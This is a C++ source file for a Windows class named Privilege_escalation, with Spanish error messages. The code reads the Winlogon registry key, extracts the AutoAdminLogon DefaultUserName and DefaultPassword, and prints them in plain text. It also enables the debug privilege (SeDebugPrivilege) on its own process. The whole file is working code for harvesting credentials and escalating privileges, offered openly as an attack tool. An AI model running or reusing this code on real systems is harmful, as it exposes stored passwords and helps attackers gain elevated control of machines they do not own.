#include "Privilege_escalation.h"
#include "HandleGuard.h"
#include <iostream>

Privilege_escalation::Privilege_escalation() {
	HKEY hKey = Privilege_escalation::existsAutoAdminLogon();

	if (hKey != NULL) {
		Privilege_escalation::getCredentialsByAutoAdminLogon(hKey);
		std::wcout << "Username\t:" << this->current_username << std::endl;
		std::wcout << "Password\t:" << this->current_password << std::endl;
	}
	else {
		RegCloseKey(hKey);
	}
}

BOOL Privilege_escalation::getCredentialsByAutoAdminLogon(HKEY hKey) {
	BOOL password = extractCredValue(hKey, L"DefaultUserName", this->current_username);
	BOOL username = extractCredValue(hKey, L"DefaultPassword", this->current_password);

	if (password && username) {
		return true;
	}
	return false;
}

BOOL Privilege_escalation::extractCredValue(HKEY hkey, LPCWSTR registryKeyValue, std::wstring &credential) {
	DWORD	dataSize = sizeof(DWORD);
	LONG	result = RegQueryValueEx(hkey, registryKeyValue, nullptr, nullptr, nullptr, &dataSize);

	if (result != ERROR_SUCCESS) {
		return FALSE;
	}
	else {
		LPBYTE data = new BYTE[dataSize];

		result = RegQueryValueEx(hkey, registryKeyValue, nullptr, nullptr, data, &dataSize);

		if (result != ERROR_SUCCESS) {
			return FALSE;
		}
		else {
			std::wstring value(reinterpret_cast<wchar_t*>(data));

			credential = value.c_str();

			delete[] data;

			return TRUE;
		}
	}
}

HKEY Privilege_escalation::existsAutoAdminLogon() {
	HKEY	hKey;
	LPCWSTR keyPath				= L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\";
	LPCWSTR valueName			= L"AutoAdminLogon";
	LONG	result				= RegOpenKeyEx(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
	DWORD	autoAdminLogonValue = 0;

	if (result != ERROR_SUCCESS) {
		return NULL;
	}
	else {
		DWORD dataSize = 0;

		result = RegQueryValueEx(hKey, valueName, nullptr, nullptr, nullptr, &dataSize);

		if (result != ERROR_SUCCESS) {
			return NULL;
		}
		else {
			LPBYTE data = new BYTE[dataSize];

			result = RegQueryValueEx(hKey, valueName, nullptr, nullptr, data, &dataSize);

			if (result != ERROR_SUCCESS) {
				return NULL;
			}
			else {
				return hKey;
			}
		}
	}
}

BOOL Privilege_escalation::enableDebugPrivilege() {
	HANDLE hToken;
	TOKEN_PRIVILEGES tkpriv;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		std::cerr << "Error al abrir el token del proceso. Código de error: " << GetLastError() << std::endl;
		return FALSE;
	}

	if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tkpriv.Privileges[0].Luid)) {
		std::cerr << "Error al obtener el privilegio de depuración. Código de error: " << GetLastError() << std::endl;
		CloseHandle(hToken);
		return FALSE;
	}

	tkpriv.PrivilegeCount = 1;
	tkpriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hToken, FALSE, &tkpriv, sizeof(tkpriv), NULL, NULL);

	// Verifica si AdjustTokenPrivileges tuvo éxito
	DWORD dwError = GetLastError();
	if (dwError == ERROR_SUCCESS) {
		std::cout << "Privilegio de depuración habilitado correctamente." << std::endl;
		CloseHandle(hToken);
		return TRUE;
	}
	else if (dwError == ERROR_NOT_ALL_ASSIGNED) {
		std::cerr << "El privilegio no fue asignado. Código de error: " << dwError << std::endl;
	}
	else {
		std::cerr << "Error al ajustar los privilegios. Código de error: " << dwError << std::endl;
	}

	CloseHandle(hToken);
	return FALSE;
}

